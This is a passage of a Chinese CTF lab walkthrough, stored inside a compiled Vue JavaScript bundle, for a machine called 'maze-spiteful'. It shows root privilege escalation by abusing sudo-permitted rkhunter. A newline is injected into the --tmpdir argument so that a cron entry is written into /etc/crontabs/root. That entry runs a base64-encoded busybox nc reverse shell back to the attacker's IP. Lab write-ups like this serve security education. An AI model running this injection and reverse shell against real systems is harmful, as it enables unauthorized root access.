punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Checking configuration "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" and command-line options"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("..")]),s._v(".\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Detected operating system is "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Linux'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Found O/S name: Alpine Linux v3.22\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Command line is /usr/local/bin/rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tmpdir")]),s._v(" /tmp/\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("111")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Environment shell is /bin/sh"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" rkhunter is using busybox\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Using configuration "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/etc/rkhunter.conf'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("03:56:19"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v(" Info: Installation directory is "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/usr/local'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br"),a("span",{staticClass:"line-number"},[s._v("22")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/26.png",alt:""}})]),s._v(" "),a("p",[s._v("好了，到此为止，你应该发现，我已经可以完全控制日志文件里的一行了，日志里出现了单行的 111")]),s._v(" "),a("p",[s._v("通过分析rkhunter的参数，我选择下面这几个参数：")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("-c, --check                   Check the local system（检查本地系统，让rkhunter运行起来）\n-l, --logfile [file]          Write to a logfile（写入日志文件）\n                            (Default is /var/log/rkhunter.log)\n--noappend-log                Do not append to the logfile, overwrite it（不追加日志，覆盖日志）\n--novl, --no-verbose-logging  No verbose logging（ 无详细日志记录）\n--tmpdir <directory>          Use the specified temporary directory（使用指定的临时目录）\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br")])]),a("p",[s._v("创建一个 "),a("code",[s._v("定时任务")]),s._v(" 格式的目录：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'busybox nc 192.168.6.101 4444 -e bash'")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v("base64                                                                                                 \n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('* * * * * bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"\'')]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("有一点你需要发现，--tmpdir 参数指定的目录，在 rkhunter 运行时，对目录名里出现的空格会出现不一致的效果，rkhunter 认为目录不应该出现空格，他会检查是否存在去除空格后的目录，给他单独创建，符合条件即可")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--check")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tmpdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/tmp/\n* * * * * bash -c \"echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash\"'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/27.png",alt:""}})]),s._v(" "),a("p",[s._v("把报错信息里没有空格的目录创建出来即可")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("*****bash-cechoYnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo=|base64-d|bash'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("再次运行")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--check")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /tmp/1.txt "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tmpdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/tmp/\n* * * * * bash -c \"echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash\"'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("查看日志内容，可以看到已经构造出了一行定时任务")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/28.png",alt:""}})]),s._v(" "),a("p",[s._v("现在可以尝试写到定时任务了")]),s._v(" "),a("p",[s._v("靶机定时任务位置 "),a("code",[s._v("/etc/crontabs/")])]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("spiteful:/tmp$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ps")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-ef")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("grep")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-E")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'crond|cron'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("2178")]),s._v(" root      "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(":00 /usr/sbin/crond "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-c")]),s._v(" /etc/crontabs "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("常见定时任务文件位置与格式")]),s._v(" "),a("div",{staticClass:"language-plaintext line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-plaintext"}},[a("code",[s._v("busybox crond\tAlpine/容器精简系统\t/etc/crontabs/<user>\ncrond (Cronie)\tCentOS / RHEL 系列\t/etc/crontab + /etc/cron.d/*\ncron / Vixie cron\tDebian / Ubuntu 系列\t/etc/crontab + /etc/cron.d/*\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("当前就属于 busybox crond，写入 /etc/crontabs/root 文件")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# payload 目录名")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v('* * * * * bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"\'')]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 创建去除空格的目录")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mkdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-p")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'/tmp/"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("*****bash-cechoYnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo=|base64-d|bash'")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 写入定时任务")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" root rkhunter "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--check")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--novl")]),s._v(" --noappend-log "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-l")]),s._v(" /etc/crontabs/root "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("--tmpdir")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'/tmp/\n* * * * * bash -c \"echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash\"'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/29.png",alt:""}})]),s._v(" "),a("p",[s._v("等待一分钟，kali 监听端口，拿到 root shell")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/30.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("man,goodnight!")])]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-spiteful/31.png",alt:""}})])])}),[],!1,null,null,null);a.default=e.exports}}]);